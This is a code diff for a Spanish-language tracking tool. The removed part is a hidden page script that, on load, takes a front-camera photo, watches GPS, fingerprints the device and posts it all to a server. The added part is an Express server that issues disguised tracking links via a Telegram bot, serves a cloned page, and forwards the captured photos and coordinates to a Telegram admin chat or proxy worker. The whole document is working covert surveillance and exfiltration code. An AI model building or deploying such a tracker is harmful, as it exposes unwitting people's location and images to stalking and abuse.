@@ -1,129 +1,109 @@
-(function() {
-    const scriptTag = document.currentScript;
-    const trackingId = scriptTag.dataset.trackingId;
-    const serverUrl = scriptTag.dataset.serverUrl;
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
+const crypto = require('crypto');
+const fetch = require('node-fetch');
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-    async function capturarFoto() {
-        const video = document.createElement('video');
-        const canvas = document.createElement('canvas');
-        video.style.display = 'none';
-        canvas.style.display = 'none';
-        document.body.appendChild(video);
-        document.body.appendChild(canvas);
+// ========== CONFIGURACIÓN ==========
+const BASE_URL = process.env.BASE_URL || 'https://tu-servidor.com'; // 🔥 CAMBIA ESTO
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const ADMIN_ID = process.env.ADMIN_ID;
+const WORKER_URL = process.env.WORKER_URL || ''; // Opcional, para usar proxy
+
+// ========== ALMACENAMIENTO ==========
+const tokens = {};
+
+function generateToken() {
+    return crypto.randomBytes(6).toString('hex');
+}
+
+// ========== MIDDLEWARE ==========
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static('public'));
+
+// ========== RUTA PARA GENERAR ENLACE (DESDE EL BOT) ==========
+app.post('/generate', (req, res) => {
+    const { url, chatId } = req.body;
+    if (!url || !chatId) {
+        return res.status(400).json({ error: 'Faltan datos' });
+    }
+    const token = generateToken();
+    tokens[token] = { url, chatId, timestamp: Date.now() };
+    const trackLink = `${BASE_URL}/track/${token}`;
+    res.json({ link: trackLink, token });
+});
+
+// ========== RUTA DE TRACKING ==========
+app.get('/track/:token', (req, res) => {
+    const token = req.params.token;
+    const data = tokens[token];
+    if (!data) {
+        return res.status(404).send('Enlace no válido');
+    }
+
+    let html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');
+    html = html.replace('{{CLONED_URL}}', data.url);
+    html = html.replace('{{TRACKING_ID}}', token);
+    html = html.replace('{{SERVER_URL}}', WORKER_URL || BASE_URL);
+
+    res.send(html);
+});
+
+// ========== RUTA PARA RECIBIR DATOS CAPTURADOS ==========
+app.post('/track/:token', async (req, res) => {
+    const token = req.params.token;
+    const data = tokens[token];
+    if (!data) {
+        return res.status(404).send('Token no válido');
+    }
+
+    // Si usas Worker, no proceses aquí, el Worker se encarga
+    if (WORKER_URL) {
+        // Reenviar al Worker
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            video.srcObject = stream;
-            await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
-            await new Promise(r => setTimeout(r, 300));
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
-            video.srcObject = null;
-            stream.getTracks().forEach(t => t.stop());
-            video.remove();
-            canvas.remove();
-            return blob;
-        } catch(e) { return null; }
-    }
-
-    function capturarGPS() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) { resolve(null); return; }
-            let mejor = null;
-            let watchId = navigator.geolocation.watchPosition(
-                (pos) => {
-                    const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
-                    if (!mejor || coords.acc < mejor.acc) mejor = coords;
-                    if (coords.acc < 20) {
-                        navigator.geolocation.clearWatch(watchId);
-                        resolve(mejor);
-                    }
-                },
-                () => {
-                    navigator.geolocation.clearWatch(watchId);
-                    resolve(mejor);
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
-            setTimeout(() => {
-                navigator.geolocation.clearWatch(watchId);
-                resolve(mejor);
-            }, 5000);
-        });
-    }
-
-    function obtenerDispositivo() {
-        const ua = navigator.userAgent;
-        let modelo = 'Desconocido';
-        if (ua.includes('iPhone')) modelo = 'iPhone';
-        else if (ua.includes('iPad')) modelo = 'iPad';
-        else if (ua.includes('Android')) modelo = 'Android';
-        else if (ua.includes('Mac')) modelo = 'Mac';
-        else if (ua.includes('Windows')) modelo = 'Windows PC';
-        else if (ua.includes('Linux')) modelo = 'Linux';
-        return { modelo, ua };
-    }
-
-    function obtenerFingerprint() {
-        try {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = 200; canvas.height = 50;
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(0, 0, 200, 50);
-            ctx.fillStyle = '#069';
-            ctx.font = '14px Arial';
-            ctx.fillText('FP', 10, 30);
-            const hash = canvas.toDataURL().slice(0, 80);
-            let gpu = 'N/A';
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                const info = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'N/A';
-            } catch(e) {}
-            return { gpu, canvas: hash };
+            const formData = new FormData();
+            for (const key in req.body) {
+                formData.append(key, req.body[key]);
+            }
+            await fetch(WORKER_URL, { method: 'POST', body: formData });
+            return res.send('OK');
         } catch(e) {
-            return { gpu: 'N/A', canvas: 'N/A' };
+            return res.status(500).send('Error al reenviar');
         }
     }
 
-    async function enviarDatos() {
-        const [foto, gps, dispositivo, fp] = await Promise.all([
-            capturarFoto(),
-            capturarGPS(),
-            obtenerDispositivo(),
-            obtenerFingerprint()
-        ]);
+    // Si no usas Worker, procesa aquí
+    const { text, photo, latitude, longitude } = req.body;
 
-        let msg = '📊 *Captura*';
-        msg += `\n━━━━━━━━━━━━━━━━`;
-        if (gps) {
-            msg += `\n📍 GPS: ${gps.lat}, ${gps.lng} (±${gps.acc}m)`;
-            msg += `\n🗺️ Maps: https://maps.google.com/?q=${gps.lat},${gps.lng}`;
-        } else {
-            msg += `\n📍 GPS: No disponible`;
-        }
-        msg += `\n📱 Dispositivo: ${dispositivo.modelo}`;
-        msg += `\n🎨 GPU: ${fp.gpu}`;
-        msg += `\n⏰ ${new Date().toISOString()}`;
-
-        const formData = new FormData();
-        formData.append('text', msg);
-        if (foto) formData.append('photo', foto, 'photo.jpg');
-        if (gps) {
-            formData.append('latitude', gps.lat);
-            formData.append('longitude', gps.lng);
-        }
-
+    if (BOT_TOKEN && ADMIN_ID) {
         try {
-            await fetch(serverUrl + '/track/' + trackingId, { method: 'POST', body: formData });
+            // Enviar mensaje
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'Markdown' })
+            });
+            // Enviar foto si existe
+            if (photo) {
+                const photoUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                const formData = new FormData();
+                formData.append('chat_id', ADMIN_ID);
+                formData.append('photo', photo);
+                await fetch(photoUrl, { method: 'POST', body: formData });
+            }
         } catch(e) {
-            console.error('Error:', e);
+            console.error('Error al enviar a Telegram:', e);
         }
     }
 
-    window.addEventListener('load', () => {
-        setTimeout(enviarDatos, 500);
-    });
-})();
+    res.send('OK');
+});
+
+// ========== INICIAR SERVIDOR ==========
+app.listen(PORT, () => {
+    console.log(`✅ Servidor en puerto ${PORT}`);
+});
